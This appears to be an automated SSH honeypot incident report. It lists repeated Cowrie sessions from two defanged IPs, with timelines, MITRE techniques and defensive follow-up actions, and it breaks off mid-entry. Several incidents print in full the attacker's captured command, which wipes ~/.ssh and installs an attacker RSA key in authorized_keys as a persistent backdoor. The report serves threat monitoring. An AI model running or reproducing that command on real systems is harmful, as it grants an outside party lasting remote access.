| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:12:53` | `cowrie.session.connect` |
| `2026-06-09 22:12:53` | `cowrie.client.version` |
| `2026-06-09 22:12:53` | `cowrie.client.kex` |
| `2026-06-09 22:12:53` | `cowrie.login.success` |
| `2026-06-09 22:12:53` | `cowrie.session.params` |
| `2026-06-09 22:12:53` | `cowrie.command.input` |
| `2026-06-09 22:12:53` | `cowrie.command.failed` |
| `2026-06-09 22:12:53` | `cowrie.log.closed` |
| `2026-06-09 22:12:53` | `cowrie.session.params` |
| `2026-06-09 22:12:53` | `cowrie.command.input` |
| `2026-06-09 22:12:53` | `cowrie.session.file_download` |
| `2026-06-09 22:12:53` | `cowrie.log.closed` |
| `2026-06-09 22:12:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-477b516b569c

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-09 22:12 |
| **Last Seen** | 2026-06-09 22:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:12:55` | `cowrie.session.connect` |
| `2026-06-09 22:12:55` | `cowrie.client.version` |
| `2026-06-09 22:12:55` | `cowrie.client.kex` |
| `2026-06-09 22:12:55` | `cowrie.login.success` |
| `2026-06-09 22:12:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-116ed0ee61b1

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:13 |
| **Last Seen** | 2026-06-09 22:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:13:35` | `cowrie.session.connect` |
| `2026-06-09 22:13:35` | `cowrie.client.version` |
| `2026-06-09 22:13:35` | `cowrie.client.kex` |
| `2026-06-09 22:13:36` | `cowrie.login.success` |
| `2026-06-09 22:13:36` | `cowrie.session.params` |
| `2026-06-09 22:13:36` | `cowrie.command.input` |
| `2026-06-09 22:13:36` | `cowrie.command.failed` |
| `2026-06-09 22:13:37` | `cowrie.log.closed` |
| `2026-06-09 22:13:37` | `cowrie.session.params` |
| `2026-06-09 22:13:37` | `cowrie.command.input` |
| `2026-06-09 22:13:37` | `cowrie.session.file_download` |
| `2026-06-09 22:13:37` | `cowrie.log.closed` |
| `2026-06-09 22:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-146c7064cfe1

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:13 |
| **Last Seen** | 2026-06-09 22:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:13:40` | `cowrie.session.connect` |
| `2026-06-09 22:13:40` | `cowrie.client.version` |
| `2026-06-09 22:13:40` | `cowrie.client.kex` |
| `2026-06-09 22:13:41` | `cowrie.login.success` |
| `2026-06-09 22:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19bcdc2a4ded

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:21 |
| **Last Seen** | 2026-06-09 22:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:21:46` | `cowrie.session.connect` |
| `2026-06-09 22:21:46` | `cowrie.client.version` |
| `2026-06-09 22:21:47` | `cowrie.client.kex` |
| `2026-06-09 22:21:47` | `cowrie.login.success` |
| `2026-06-09 22:21:48` | `cowrie.session.params` |
| `2026-06-09 22:21:48` | `cowrie.command.input` |
| `2026-06-09 22:21:48` | `cowrie.command.failed` |
| `2026-06-09 22:21:48` | `cowrie.log.closed` |
| `2026-06-09 22:21:49` | `cowrie.session.params` |
| `2026-06-09 22:21:49` | `cowrie.command.input` |
| `2026-06-09 22:21:49` | `cowrie.session.file_download` |
| `2026-06-09 22:21:49` | `cowrie.log.closed` |
| `2026-06-09 22:21:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c791ee303648

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:21 |
| **Last Seen** | 2026-06-09 22:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:21:52` | `cowrie.session.connect` |
| `2026-06-09 22:21:52` | `cowrie.client.version` |
| `2026-06-09 22:21:52` | `cowrie.client.kex` |
| `2026-06-09 22:21:53` | `cowrie.login.success` |
| `2026-06-09 22:21:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ab7179f947a

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-09 22:23 |
| **Last Seen** | 2026-06-09 22:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:23:30` | `cowrie.session.connect` |
| `2026-06-09 22:23:30` | `cowrie.client.version` |
| `2026-06-09 22:23:30` | `cowrie.client.kex` |
| `2026-06-09 22:23:30` | `cowrie.login.success` |
| `2026-06-09 22:23:30` | `cowrie.session.params` |
| `2026-06-09 22:23:30` | `cowrie.command.input` |
| `2026-06-09 22:23:30` | `cowrie.command.failed` |
| `2026-06-09 22:23:30` | `cowrie.log.closed` |
| `2026-06-09 22:23:30` | `cowrie.session.params` |
| `2026-06-09 22:23:30` | `cowrie.command.input` |
| `2026-06-09 22:23:30` | `cowrie.session.file_download` |
| `2026-06-09 22:23:30` | `cowrie.log.closed` |
| `2026-06-09 22:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb1a464425e9

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-09 22:23 |
| **Last Seen** | 2026-06-09 22:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:23:31` | `cowrie.session.connect` |
| `2026-06-09 22:23:31` | `cowrie.client.version` |
| `2026-06-09 22:23:31` | `cowrie.client.kex` |
| `2026-06-09 22:23:32` | `cowrie.login.success` |
| `2026-06-09 22:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f1529a16d1f

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:26 |
| **Last Seen** | 2026-06-09 22:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:26:38` | `cowrie.session.connect` |
| `2026-06-09 22:26:38` | `cowrie.client.version` |
| `2026-06-09 22:26:39` | `cowrie.client.kex` |
| `2026-06-09 22:26:39` | `cowrie.login.success` |
| `2026-06-09 22:26:40` | `cowrie.session.params` |
| `2026-06-09 22:26:40` | `cowrie.command.input` |
| `2026-06-09 22:26:40` | `cowrie.command.failed` |
| `2026-06-09 22:26:40` | `cowrie.log.closed` |
| `2026-06-09 22:26:41` | `cowrie.session.params` |
| `2026-06-09 22:26:41` | `cowrie.command.input` |
| `2026-06-09 22:26:41` | `cowrie.session.file_download` |
| `2026-06-09 22:26:41` | `cowrie.log.closed` |
| `2026-06-09 22:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f74eb0f7b7ff

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:26 |
| **Last Seen** | 2026-06-09 22:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:26:44` | `cowrie.session.connect` |
| `2026-06-09 22:26:44` | `cowrie.client.version` |
| `2026-06-09 22:26:44` | `cowrie.client.kex` |
| `2026-06-09 22:26:45` | `cowrie.login.success` |
| `2026-06-09 22:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-888009300504

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:29 |
| **Last Seen** | 2026-06-09 22:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:29:58` | `cowrie.session.connect` |
| `2026-06-09 22:29:58` | `cowrie.client.version` |
| `2026-06-09 22:29:58` | `cowrie.client.kex` |
| `2026-06-09 22:29:59` | `cowrie.login.success` |
| `2026-06-09 22:29:59` | `cowrie.session.params` |
| `2026-06-09 22:29:59` | `cowrie.command.input` |
| `2026-06-09 22:29:59` | `cowrie.command.failed` |
| `2026-06-09 22:30:00` | `cowrie.log.closed` |
| `2026-06-09 22:30:00` | `cowrie.session.params` |
| `2026-06-09 22:30:00` | `cowrie.command.input` |
| `2026-06-09 22:30:00` | `cowrie.session.file_download` |
| `2026-06-09 22:30:00` | `cowrie.log.closed` |
| `2026-06-09 22:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-079d72723b10

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:30 |
| **Last Seen** | 2026-06-09 22:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:30:03` | `cowrie.session.connect` |
| `2026-06-09 22:30:03` | `cowrie.client.version` |
| `2026-06-09 22:30:03` | `cowrie.client.kex` |
| `2026-06-09 22:30:04` | `cowrie.login.success` |
| `2026-06-09 22:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25c282292c71

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:33 |
| **Last Seen** | 2026-06-09 22:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:33:15` | `cowrie.session.connect` |
| `2026-06-09 22:33:15` | `cowrie.client.version` |
| `2026-06-09 22:33:15` | `cowrie.client.kex` |
| `2026-06-09 22:33:16` | `cowrie.login.success` |
| `2026-06-09 22:33:17` | `cowrie.session.params` |
| `2026-06-09 22:33:17` | `cowrie.command.input` |
| `2026-06-09 22:33:17` | `cowrie.command.failed` |
| `2026-06-09 22:33:17` | `cowrie.log.closed` |
| `2026-06-09 22:33:18` | `cowrie.session.params` |
| `2026-06-09 22:33:18` | `cowrie.command.input` |
| `2026-06-09 22:33:18` | `cowrie.session.file_download` |
| `2026-06-09 22:33:18` | `cowrie.log.closed` |
| `2026-06-09 22:33:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83187df66544

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:33 |
| **Last Seen** | 2026-06-09 22:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:33:21` | `cowrie.session.connect` |
| `2026-06-09 22:33:21` | `cowrie.client.version` |
| `2026-06-09 22:33:21` | `cowrie.client.kex` |
| `2026-06-09 22:33:22` | `cowrie.login.success` |
| `2026-06-09 22:33:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01da086ecbd4

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:34 |
| **Last Seen** | 2026-06-09 22:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:34:55` | `cowrie.session.connect` |
| `2026-06-09 22:34:55` | `cowrie.client.version` |
| `2026-06-09 22:34:55` | `cowrie.client.kex` |
| `2026-06-09 22:34:56` | `cowrie.login.success` |
| `2026-06-09 22:34:57` | `cowrie.session.params` |
| `2026-06-09 22:34:57` | `cowrie.command.input` |
| `2026-06-09 22:34:57` | `cowrie.command.failed` |
| `2026-06-09 22:34:57` | `cowrie.log.closed` |
| `2026-06-09 22:34:57` | `cowrie.session.params` |
| `2026-06-09 22:34:57` | `cowrie.command.input` |
| `2026-06-09 22:34:58` | `cowrie.session.file_download` |
| `2026-06-09 22:34:58` | `cowrie.log.closed` |
| `2026-06-09 22:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aa1b7082b44

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:35 |
| **Last Seen** | 2026-06-09 22:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:35:00` | `cowrie.session.connect` |
| `2026-06-09 22:35:00` | `cowrie.client.version` |
| `2026-06-09 22:35:01` | `cowrie.client.kex` |
| `2026-06-09 22:35:02` | `cowrie.login.success` |
| `2026-06-09 22:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7948f7a052b3

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:36 |
| **Last Seen** | 2026-06-09 22:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:36:29` | `cowrie.session.connect` |
| `2026-06-09 22:36:29` | `cowrie.client.version` |
| `2026-06-09 22:36:29` | `cowrie.client.kex` |
| `2026-06-09 22:36:30` | `cowrie.login.success` |
| `2026-06-09 22:36:31` | `cowrie.session.params` |
| `2026-06-09 22:36:31` | `cowrie.command.input` |
| `2026-06-09 22:36:31` | `cowrie.command.failed` |
| `2026-06-09 22:36:31` | `cowrie.log.closed` |
| `2026-06-09 22:36:31` | `cowrie.session.params` |
| `2026-06-09 22:36:31` | `cowrie.command.input` |
| `2026-06-09 22:36:31` | `cowrie.session.file_download` |
| `2026-06-09 22:36:31` | `cowrie.log.closed` |
| `2026-06-09 22:36:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-156e55c6cc38

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:36 |
| **Last Seen** | 2026-06-09 22:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

